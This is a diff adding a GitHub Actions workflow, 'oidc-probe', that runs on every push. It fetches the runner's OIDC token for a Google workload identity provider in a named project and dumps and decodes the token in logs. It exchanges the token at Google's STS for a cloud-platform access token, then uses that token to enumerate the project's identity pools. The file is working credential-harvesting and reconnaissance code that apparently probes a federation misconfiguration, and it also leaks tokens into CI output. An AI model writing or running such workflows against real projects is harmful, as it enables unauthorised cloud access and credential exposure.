@@ -1,0 +1,32 @@
+name: oidc-probe
+on:
+  workflow_dispatch:
+  push:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump token
+        env:
+          AUD: //iam.googleapis.com/projects/149671192594/locations/global/workloadIdentityPools/github-actions/providers/github
+        run: |
+          set -x
+          echo "CTX repo=$GITHUB_REPOSITORY ref=$GITHUB_REF sub_guess=$GITHUB_REPOSITORY:ref:$GITHUB_REF"
+          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" -o tok.json
+          head -c 200 tok.json; echo
+          T=$(python3 -c "import json;print(json.load(open('tok.json'))['value'])")
+          echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null; echo
+          echo "$T" > id_token.txt
+          cat > body.json <<EOF
+          {"grant_type":"urn:ietf:params:oauth:grant-type:token-exchange","audience":"$AUD","scope":"https://www.googleapis.com/auth/cloud-platform","requested_token_type":"urn:ietf:params:oauth:token-type:access_token","subject_token_type":"urn:ietf:params:oauth:token-type:jwt","subject_token":"$T"}
+          EOF
+          echo "=== STS ==="
+          curl -sS -X POST https://sts.googleapis.com/v1/token -H 'content-type: application/json' -d @body.json -w '\nHTTP:%{http_code}\n' | tee sts.out
+          if grep -q access_token sts.out; then
+            FT=$(python3 -c "import json;print(json.load(open('sts.out'))['access_token'])" 2>/dev/null)
+            [ -n "$FT" ] && { echo "=== POOLS ==="; curl -sS -H "Authorization: Bearer $FT" 'https://iam.googleapis.com/v1/projects/149671192594/locations/global/workloadIdentityPools?pageSize=100' -w '\nHTTP:%{http_code}\n'; }
+          fi
+
